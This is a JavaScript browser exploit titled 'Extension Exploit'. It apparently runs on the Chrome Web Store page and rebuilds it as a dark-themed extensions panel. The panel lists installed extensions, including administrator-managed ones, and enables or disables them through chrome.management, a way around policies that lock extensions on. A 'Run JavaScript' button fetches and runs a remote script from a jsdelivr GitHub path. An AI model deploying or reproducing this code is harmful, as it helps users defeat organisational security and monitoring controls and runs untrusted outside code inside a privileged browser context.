var developerMode = false
function isPageDev() {
  return localStorage.getItem('dev') ? 'dev' : ''
}
function isButtonDev() {
  return localStorage.getItem('dev') ? '' : 'unchecked'
}
function removeExtension(n) {
  chrome.management.uninstall(n)
}
function blobToDataURL(n) {
  return new Promise((e, t) => {
    var i = new FileReader()
    i.onload = function (n) {
      e(n.target.result)
    }
    i.onerror = function (n) {
      t(i.error)
    }
    i.onabort = function (n) {
      t(new Error('Read aborted'))
    }
    i.readAsDataURL(n)
  })
}
async function getIconFromExtension(n) {
  return n
    ? ((n = await (
        await fetch('https://chrome.google.com/webstore/detail/' + n)
      ).text()),
      (n = new DOMParser().parseFromString(n, 'text/html')).querySelector(
        'img.e-f-s[src]'
      )
        ? ((n = n.querySelector('img.e-f-s[src]').src),
          blobToDataURL(await (await fetch(n)).blob()))
        : '')
    : ''
}
function toggleExtension(n, e) {
  n.hasAttribute('unchecked')
    ? chrome.management.setEnabled(e, true)
    : chrome.management.setEnabled(e, false)
}
function toggle(n) {
  n.hasAttribute('unchecked')
    ? n.removeAttribute('unchecked')
    : n.setAttribute('unchecked', '')
}
function togglePress(n, e) {
  'down' == e
    ? n.children[1].children[0].children[0].setAttribute('open', '')
    : setTimeout(function () {
        n.children[1].children[0].children[0].style.display = 'none'
        n.children[1].children[0].children[0].removeAttribute('open')
        n.children[1].children[0].children[0].style.display = 'initial'
      }, 80)
}
function devMode() {
  document.body.hasAttribute('dev')
    ? (document.body.removeAttribute('dev'), localStorage.removeItem('dev'))
    : (document.body.setAttribute('dev', ''),
      localStorage.setItem('dev', 'true'))
}
function addExtension(n) {
  var e = document.getElementById('items'),
    t = document.createElement('div')
  t.className = 'item'
  t.setAttribute('data-id', n.id)
  n.managed && t.setAttribute('managed', '')
  var i = document.createElement('div'),
    o = ((i.className = 'item-main'), document.createElement('div')),
    r = ((o.className = 'item-img-wrapper'), document.createElement('img'))
  r.className = 'item-img'
  r.src = n.logo
  var a = document.createElement('div')
  a.className = 'item-img-source'
  a.innerHTML =
    '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" viewBox="0 0 24 24" class="item-img-source-icon"><path d="M12 7V3H2v18h20V7H12zM6 19H4v-2h2v2zm0-4H4v-2h2v2zm0-4H4V9h2v2zm0-4H4V5h2v2zm4 12H8v-2h2v2zm0-4H8v-2h2v2zm0-4H8V9h2v2zm0-4H8V5h2v2zm10 12h-8v-2h2v-2h-2v-2h2v-2h-2V9h8v10zm-2-8h-2v2h2v-2zm0 4h-2v2h2v-2z" style="fill: currentColor"></path></svg>'
  o.appendChild(r)
  o.appendChild(a)
  i.appendChild(o)
  ;(r = document.createElement('div')).className = 'item-content'
  ;(a = document.createElement('div')).className = 'item-title-and-version'
  ;(o = document.createElement('div')).className = 'item-title'
  o.innerText = n.title
  var d = document.createElement('div')
  d.className = 'item-version'
  d.innerText = n.version
  a.appendChild(o)
  a.appendChild(d)
  r.appendChild(a)
  ;(o = document.createElement('div')).className = 'item-description-overflow'
  ;(d = document.createElement('div')).className = 'item-description'
  d.innerText = n.description
  o.appendChild(d)
  r.appendChild(o)
  ;(a = document.createElement('div')).className = 'item-id'
  a.innerText = 'ID: ' + n.id
  r.appendChild(a)
  i.appendChild(r)
  t.appendChild(i)
  ;(d = document.createElement('div')).className = 'item-buttons'
  ;(o = document.createElement('div')).className = 'item-toggle'
  o.setAttribute(
    'onclick',
    "toggleExtension(this, '" + n.id + "');toggle(this)"
  )
  o.setAttribute('onmousedown', "togglePress(this, 'down')")
  o.setAttribute('onmouseup', "togglePress(this, 'up')")
  n.enabled || o.setAttribute('unchecked', '')
  ;(a = document.createElement('div')).className = 'item-bar'
  ;(r = document.createElement('div')).className = 'item-knob'
  ;(i = document.createElement('div')).className = 'item-ripple'
  ;(n = document.createElement('div')).className = 'ripple'
  i.appendChild(n)
  r.appendChild(i)
  o.appendChild(a)
  o.appendChild(r)
  d.appendChild(o)
  t.appendChild(d)
  e.appendChild(t)
}
async function getExtensions() {
  chrome.management.getAll(async function (n) {
    for (var e in n)
      n[e].isApp ||
        addExtension({
          title: n[e].name,
          version: n[e].version,
          description: n[e].description,
          id: n[e].id,
          logo: '',
          managed: 'admin' == n[e].installType,
          enabled: n[e].enabled,
        })
  })
  setTimeout(function () {
    setIcons()
  }, 100)
}
async function setIcons() {
  var n,
    e = document.querySelectorAll('.items .item')
  for (n in e)
    try {
      e[n].querySelector('.item-main .item-img-wrapper .item-img').src =
        await getIconFromExtension(e[n].dataset.id)
    } catch {}
}
window.location.toString().startsWith('https://chrome.google.com/webstore') ||
  developerMode ||
  (window.location = 'about:blank')
document.documentElement.innerHTML =
  "<html><head><link rel=\"icon\" href=\"data:image/svg+xml,<svg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' version='1.1'><path fill='white' d='M20.5 11H19V7c0-1.1-.9-2-2-2h-4V3.5C13 2.12 11.88 1 10.5 1S8 2.12 8 3.5V5H4c-1.1 0-1.99.9-1.99 2v3.8H3.5c1.49 0 2.7 1.21 2.7 2.7s-1.21 2.7-2.7 2.7H2V20c0 1.1.9 2 2 2h3.8v-1.5c0-1.49 1.21-2.7 2.7-2.7 1.49 0 2.7 1.21 2.7 2.7V22H17c1.1 0 2-.9 2-2v-4h1.5c1.38 0 2.5-1.12 2.5-2.5S21.88 11 20.5 11z'></path></svg>\">\n<title>Extension Exploit</title>\n</head>\n\n<body " +
  isPageDev() +
  '>\n<div class="nav">\n<div class="nav-left">\n<div class="nav-title">Extenstion Exploit</div>\n<div class="nav-right">\n<div class="nav-dev">Developer mode</div>\n<button onclick="var s=document.createElement(`script`);s.src=`https://cdn.jsdelivr.net/gh/Dominato014/Files/extension4.js`;document.body.appendChild(s);">Run JavaScript</button>\n<div ' +
  isButtonDev() +
  ' class="item-toggle item-toggle-dev" id="toggle" onclick="toggle(this);devMode()" onmousedown="togglePress(this, \'down\')" onmouseup="togglePress(this, \'up\')">\n<div class="item-bar"></div>\n<div class="item-knob">\n<div class="item-ripple">\n<div class="ripple"></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n\n<div class="items-main">\n<div class="items" id="items">\n<div class="patched">Error: This may have been patched</div>\n</div>\n</div>\n\n<style>\n@import url(\'https://fonts.googleapis.com/css2?family=Roboto&display=swap\');\n@import url(\'https://fonts.googleapis.com/css2?family=Roboto:wght@500&display=swap\');\n\n* {\nfont-family: "Roboto";\n}\n\n:root {\n    color-scheme: dark;\n}\n\nbody {\nbackground: #202124;\nmargin: 0;\npadding: 0;\n}\n\n.nav {\nwidth: 100%;\nheight: 55px;\nbackground: #292a2d;\nborder-bottom: 1px solid rgba(255, 255, 255, .1);\nposition: fixed;\n    top: 0;\n    right: 0;\n    left: 0;\nz-index: 9;\n}\n\n.nav-left {\n    align-items: center;\n    box-sizing: border-box;\n    display: flex;\n    padding-inline-start: calc(12px + 6px);\n    height: 55px;\n}\n\n.nav-right {\nposition: absolute;\n    right: 0;\n    left: 0;\n    display: flex;\n    justify-content: flex-end;\n}\n\n.nav-dev {\ncolor: rgb(154, 160, 166);\n    font-size: 13px;\n    margin-inline-end: calc(16px + 30px);\n    margin-bottom: 3px;\n}\n\n.item-toggle-dev {\ntransform: translateX(-30px);\n}\n\n.nav-title {\n    color: rgb(232, 234, 237);\n    font-size: 22px;\n    letter-spacing: .25px;\n    line-height: normal;\n    margin-inline-start: 6px;\n    padding-inline-end: 12px;\n    font-weight: 500;\n}\n\n.items-main {\nmin-width: 400px;\npadding: 24px 60px 64px;\nmargin-top: 57px;\n}\n\n.items {\ndisplay: grid;\ngrid-column-gap: 12px;\ngrid-row-gap: 12px;\ngrid-template-columns: repeat(auto-fill,400px);\njustify-content: center;\nmargin: auto;\n/*max-width: calc(400px * 3 + 12pz * 3);*/\n}\n\n.item {\nheight: 160px;\nwidth: 400px;\nbackground: #292a2d;\nborder-radius: 8px;\nbox-shadow: rgba(0, 0, 0, .3) 0 1px 2px 0, rgba(0, 0, 0, .15) 0 2px 6px 2px;\n/*transition: height .3s cubic-bezier(.25,.1,.25,1);*/\n}\n\n.item-main {\ndisplay: flex;\n    flex: 1;\n    min-height: 0;\n    padding: 16px 20px;\n    height: 80px;\n}\n\n.item-img-wrapper {\n    align-self: flex-start;\n    display: flex;\n    padding: 6px;\n    position: relative;\n}\n\n.item-img {\nheight: 36px;\nwidth: 36px;\nborder-radius: 6px;\n    background: #202124;\n    text-indent: -10000px;\n}\n\n.item-img-source {\nalign-items: center;\n    background: #f1592b;\n    border-radius: 50%;\n    box-shadow: 0 1px 1px 0 rgb(0 0 0 / 22%), 0 2px 2px 0 rgb(0 0 0 / 12%);\n    display: flex;\n    height: 22px;\n    justify-content: center;\n    width: 22px;\n    margin-inline-start: 24px;\n    margin-top: 24px;\n    position: absolute;\ndisplay: none;\n}\n\n.item[managed] .item-img-source {\ndisplay: flex;\n}\n\n.item-img-source-icon {\npointer-events: none;\n    display: block;\n    height: 16px;\n    width: 16px;\n    color: white;\n}\n\n.item-content {\n    display: flex;\n    flex: 1;\n    flex-direction: column;\n    margin-inline-start: 24px;\n    width: 288px;\n    overflow: hidden;\n}\n\n.item-title-and-version {\n    display: flex;\n    align-items: center;\n    flex-direction: row;\n}\n\n.item-title {\nmargin-inline-end: 8px;\ncolor: rgb(232, 234, 237);\nwhite-space: nowrap;\nmargin-bottom: 4px;\n    font-size: 13px;\n    margin-top: 2px;\n    text-overflow: ellipsis;\n    overflow: hidden;\n}\n\n.item-version {\n    color: rgb(154, 160, 166);\n    font-size: 13px;\n    margin-bottom: 4px;\ndisplay: none;\n}\n\n.item-description-overflow {\n    height: 84px;\n    overflow: hidden;\n}\n\n.item-description {\ncolor: rgb(154, 160, 166);\noverflow: hidden;\ntext-overflow: ellipsis;\nflex: 1;\n    font-size: 13px;\n    line-height: 20.02px;\n    margin-top: 3px;\n}\n\n.item-id {\n    color: rgb(154, 160, 166);\n    font-size: 13px;\n    margin-top: 5px;\ndisplay: none;\n}\n\n.item-buttons {\n    height: 48px;\n    display: flex;\n    flex-direction: row;\n    align-items: center;\n    justify-content: flex-end;\n    padding-right: 38px;\n    padding-bottom: 8px;\n    padding-top: 8px;\n    box-sizing: border-box;\n}\n\n.item-left-buttons {\n    display: flex;\n    flex-direction: row;\n    align-items: center;\n    flex: 1;\n    flex-basis: 1e-9px;\n}\n\n.item-left-button {\nborder: 1px solid rgb(95, 99, 104);\n    align-items: center;\n    border-radius: 4px;\n    box-sizing: border-box;\n    color: rgb(138, 180, 248);\n    cursor: pointer;\n    display: inline-flex;\n    font-weight: 500;\n    height: 32px;\n    justify-content: center;\n    min-width: 5.14em;\n    overflow: hidden;\n    padding: 8px 16px;\n    user-select: none;\n    margin-inline-start: 8px;\n    font-size: 13px;\n    line-height: 20.02px;\n}\n\n.item-left-button:hover {\nbackground: rgba(138, 180, 248, 0.08);\n}\n\n.item-left-button:active {\nbackground: rgba(138, 180, 248, 0.25);\n}\n\n.item-toggle {\n    position: relative;\n    cursor: pointer;\n}\n\n.item-toggle[unchecked] .item-bar {\nbackground: rgb(154, 160, 166);\n    opacity: 1;\n}\n\n.item-toggle[unchecked] .item-knob {\nbackground: rgb(218, 220, 224);\ntransform: initial;\n}\n\n.item-bar {\n    background: rgb(138, 180, 248);\n    border-radius: 8px;\n    height: 12px;\n    left: 3px;\n    position: absolute;\n    top: 2px;\n    transition: background-color linear 80ms;\n    width: 28px;\n    opacity: 0.5;\n}\n\n.item-knob {\n    background: rgb(138, 180, 248);\n    transform: translate3d(18px, 0, 0);\n    border-radius: 50%;\n    display: block;\n    height: 16px;\n    position: relative;\n    transition: transform linear 80ms, background-color linear 80ms;\n    width: 16px;\n    box-shadow: 0 1px 3px 0 rgb(0 0 0 / 40%);\n}\n\n.item-ripple {\n    color: rgb(218, 220, 224);\n    height: 40px;\n    left: 50%;\n    outline: none;\n    pointer-events: none;\n    position: absolute;\n    top: 50%;\n    transform: translate(-50%, -50%);\n    transition: color linear 80ms;\n    width: 40px;\n}\n\n.ripple {\n    height: 40px;\n    width: 40px;\n    border-radius: 50%;\n    background-color: currentcolor;\n    left: 0;\n    opacity: 0.25;\n    pointer-events: none;\n    position: absolute;\n    will-change: height, transform, width;\ntransform: scaleX(0) scaleY(0);\ntransition: transform linear 80ms;\n\n}\n\n.ripple[open] {\ntransform: initial;\n}\n\nbody[dev] .item {\nheight: 208px;\n}\n\nbody[dev] .item-main {\nheight: 125px;\n}\n\nbody[dev] .item-version, body[dev] .item-id {\ndisplay: initial;\n}\n\n.patched {\ncolor: rgb(154, 160, 166);\n    font-size: 15.99px;\n    font-weight: 500;\n    margin-top: 80px;\n    text-align: center;\ndisplay: none;\n}\n\n.items[patched] {\ngrid-template-columns: initial;\n}\n\n.items[patched] .patched {\ndisplay: initial;\n}\n</style>\n</body>\n</html>'
chrome.management
  ? getExtensions()
  : document.getElementById('items').setAttribute('patched', '')
